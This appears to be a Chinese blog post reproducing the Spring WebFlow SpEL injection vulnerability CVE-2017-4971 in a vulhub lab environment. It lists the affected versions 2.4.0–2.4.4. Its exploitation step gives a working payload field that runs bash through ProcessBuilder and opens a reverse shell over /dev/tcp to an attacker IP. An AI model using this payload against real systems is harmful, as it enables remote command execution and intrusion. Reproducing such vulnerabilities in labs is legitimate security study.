---
layout: post
title: Spring WebFlow 远程代码执行漏洞
tags: Spring WebFlow
categories: CVE-2017-4971
---

# Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）

## 漏洞描述

Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
环境启动后访问`http://your-ip:8080`可以看到一个酒店预订的页面，这是spring-webflow官方给的简单示例。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2017-4971/15940295695691.jpg)

接着访问`http://your-ip:8080/login`，使用左边的账号密码登录

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2017-4971/15940296752888.jpg)

然后访问id为1的酒店http://your-ip:8080/hotels/1，点击预订按钮“Book Hotel”，填写相关信息后点击“Process”

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2017-4971/15940300431405.jpg)

再点击确认“Confirm”：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2017-4971/15940299427295.jpg)

此时抓包，抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC，特殊符号URL编码）：

_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/10.0.0.1/21 0>&1")).start()=vulhub

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2017-4971/15940308302828.jpg)

同时在攻击机开启监听，成功反弹shell：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring/CVE-2017-4971/15940305208615.jpg)

## 受影响版本

Spring WebFlow 2.4.0 ~ 2.4.4